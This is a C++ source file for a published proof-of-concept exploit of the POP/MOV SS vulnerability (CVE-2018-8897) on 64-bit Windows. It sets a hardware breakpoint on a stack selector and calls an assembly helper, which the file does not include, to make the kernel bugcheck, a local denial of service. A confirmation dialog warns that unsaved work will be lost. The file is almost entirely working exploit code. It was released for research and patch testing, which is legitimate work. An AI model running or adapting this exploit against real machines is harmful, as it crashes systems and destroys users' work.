/*
*	Module Name:
*		movss.cpp
*
*	Abstract:
*		Implements the POP/MOV SS (CVE-2018-8897) vulnerability by bugchecking 
*		the machine (local DoS). 
*
*		For more information, check out our whitepaper:
*		https://www.triplefault.io/2018/05/spurious-db-exceptions-with-pop-ss.html
*
*	Authors:
*		Nick Peterson <everdox@gmail.com> | http://everdox.net/
*		Nemanja (Nemi) Mulasmajic <nm@triplefault.io> | http://triplefault.io/
*
*/

#if !defined(_WIN32)
#error "This version of the exploit is only compatible with Windows."
#endif

#if !defined(_M_AMD64)
#error "This exploit must be compiled as 64-bit code."
#endif

#pragma warning(push, 0)
#include <windows.h>
#pragma warning(pop)

// The X86 architecture supports only 4 debug registers: DR0, DR1, DR2, and 
// DR3.
enum class DEBUG_REGISTERS
{
	DR0 = 0,
	DR1 = 1,
	DR2 = 2,
	DR3 = 3
};

// A hardware breakpoint can be from 1 to 4 (8 on X64) bytes in size.
enum class BREAKPOINT_SIZE
{
	One = 0,
	Two = 1,
	Eight = 2,
	Four = 3
};

// A hardware breakpoint can occur on data WRITE, ACCESS (READ/WRITE), or 
// EXECUTE.
enum class BREAKPOINT_TYPE
{
	Write = 1,
	Access = 3,
	Execute = 0
};

// The pseudo-handle for the current thread.
#define NtCurrentThread()		((HANDLE)-2)

// This is the global memory address we apply the hardware breakpoint on.
extern "C" WORD StackSelector	= 0;

// A helper function in assembly that performs the magic.
extern "C" void __cdecl Execute();

/*
*	Sets a data breakpoint (hardware breakpoint) on a user-supplied address.
*/
extern "C" uintptr_t __stdcall SetDataBreakpoint(
	_In_ uintptr_t				Address,
	_In_ BREAKPOINT_SIZE		Size,
	_In_ DEBUG_REGISTERS		Register = DEBUG_REGISTERS::DR0,
	_In_ BREAKPOINT_TYPE		Type = BREAKPOINT_TYPE::Access
)
{
	// 17.2.4: Debug Control Register (DR7)
	static uintptr_t DR7 = 0;

	// L0 through L3 (local breakpoint enable) flags (bits 0, 2, 4, and 6)
	DR7 |= ((uintptr_t)1 << ((uintptr_t)Register << (uintptr_t)1));

	// R/W0 through R/W3 (read/write) fields (bits 16, 17, 20, 21, 24, 25, 28,
	// and 29)
	DR7 |= ((uintptr_t)Type << (((uintptr_t)Register << 2) + 16));

	// LEN0 through LEN3 (Length) fields (bits 18, 19, 22, 23, 26, 27, 30, and
	// 31)
	DR7 |= ((uintptr_t)Size << (((uintptr_t)Register << 2) + 18));

	// The CONTEXT structure needs to be aligned on a 16 byte boundary; this 
	// makes sure that is the case.
	PCONTEXT Context = (PCONTEXT)_aligned_malloc(sizeof(CONTEXT), 16);
	if (!Context)
		return 0;

	memset(Context, 0, sizeof(CONTEXT));

	// Adjust the hardware breakpoints (only).
	Context->ContextFlags = CONTEXT_DEBUG_REGISTERS;

	// Adjust the DR* contents for this thread.
	((uintptr_t*)&Context->Dr0)[(uintptr_t)Register] = Address;
	Context->Dr7 = DR7;

	BOOL bSuccess = SetThreadContext(NtCurrentThread(), Context);

	// Make sure we don't leak any memory.
	_aligned_free(Context);

	return ((bSuccess) ? Address : 0);
}

/*
*	The entry point of the program.
*/
int CALLBACK WinMain(
	_In_ HINSTANCE			hInstance,
	_In_opt_ HINSTANCE		hPrevInstance,
	_In_ LPSTR				lpCmdLine,
	_In_ int				nCmdShow
)
{
	UNREFERENCED_PARAMETER(hInstance);
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);
	UNREFERENCED_PARAMETER(nCmdShow);

	// (In)sanity check.
	if (MessageBoxA(NULL,
		"WARNING: This will cause your machine to bugcheck.\n"
		"All unsaved work will be lost.\n\n"
		"Click 'YES' to continue at your own risk.",
		"Are you sure you want to continue?",
		MB_ICONERROR | MB_YESNOCANCEL | MB_DEFBUTTON2)
		== IDYES)
	{
		__try
		{
			// Abandon hope all ye who enter here.
			Execute();
		}
		__except (EXCEPTION_EXECUTE_HANDLER)
		{
			
		}

		// If we get this far, that means the vulnerability was not able to 
		// bugcheck the machine.
		MessageBoxA(NULL, 
			"If you're able to get this far, that means your machine "
			"has not bugchecked. The issue is most likely resolved "
			"on your OS version.\n", 
			"Your machine isn't vulnerable.",
			MB_ICONINFORMATION);

		ExitProcess(1);
	}

	ExitProcess(0);
}